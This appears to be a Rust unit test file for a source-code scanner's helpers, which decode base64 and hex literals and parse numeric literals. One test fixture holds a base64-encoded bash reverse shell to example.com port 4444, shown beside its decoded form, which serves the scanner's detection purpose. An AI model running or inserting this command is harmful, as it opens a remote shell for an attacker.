use super::{
    decode_printable_base64_literal, decode_printable_hex_literal, is_numeric_node_kind,
    parse_numeric_literal,
};

#[test]
fn decodes_unpadded_printable_base64_source_literals() {
    assert_eq!(
        decode_printable_base64_literal(
            "YmFzaCAtYyAnYmFzaCAtaSA+JiAvZGV2L3RjcC9leGFtcGxlLmNvbS80NDQ0IDA+JjEn"
        )
        .as_deref(),
        Some("bash -c 'bash -i >& /dev/tcp/example.com/4444 0>&1'")
    );
}

#[test]
fn rejects_short_or_binary_base64_source_literals() {
    assert_eq!(decode_printable_base64_literal("aGVsbG8="), None);
    assert_eq!(
        decode_printable_base64_literal("AAECAwQFBgcICQoLDA0ODxAREhMUFRYX"),
        None
    );
}

#[test]
fn decodes_compact_printable_hex_source_literals() {
    assert_eq!(
        decode_printable_hex_literal("6372656174654465636970686572").as_deref(),
        Some("createDecipher")
    );
    assert_eq!(
        decode_printable_hex_literal("5f636f6d70696c65").as_deref(),
        Some("_compile")
    );
}

#[test]
fn rejects_short_or_binary_hex_source_literals() {
    assert_eq!(decode_printable_hex_literal("686578"), None);
    assert_eq!(decode_printable_hex_literal("deadbeefdeadbeef"), None);
    assert_eq!(decode_printable_hex_literal("not-hexadecimal"), None);
}

#[test]
fn parse_decimal_octal_hex_binary() {
    assert_eq!(parse_numeric_literal("4444"), Some((4444, 10)));
    assert_eq!(parse_numeric_literal("0o777"), Some((511, 8)));
    assert_eq!(parse_numeric_literal("0xDEADBEEF"), Some((0xDEADBEEF, 16)));
    assert_eq!(parse_numeric_literal("0b1010"), Some((10, 2)));
}

#[test]
fn parse_rejects_floats() {
    assert_eq!(parse_numeric_literal("3.14"), None);
    assert_eq!(parse_numeric_literal("1e10"), None);
}

#[test]
fn parse_strips_digit_separators_and_suffixes() {
    assert_eq!(parse_numeric_literal("1_000_000"), Some((1_000_000, 10)));
    assert_eq!(parse_numeric_literal("4444u16"), Some((4444, 10)));
    assert_eq!(
        parse_numeric_literal("0xDEAD_BEEFi64"),
        Some((0xDEADBEEF, 16))
    );
}

#[test]
fn is_numeric_node_kind_matches_known_grammars() {
    assert!(is_numeric_node_kind("number"));
    assert!(is_numeric_node_kind("integer"));
    assert!(is_numeric_node_kind("integer_literal"));
    assert!(is_numeric_node_kind("int_literal"));
    assert!(is_numeric_node_kind("number_literal"));
    assert!(is_numeric_node_kind("hex_integer_literal"));
    assert!(is_numeric_node_kind("decimal_integer_literal"));
    assert!(!is_numeric_node_kind("float_literal"));
    assert!(!is_numeric_node_kind("real_literal"));
    assert!(!is_numeric_node_kind("string"));
    assert!(!is_numeric_node_kind("identifier"));
}
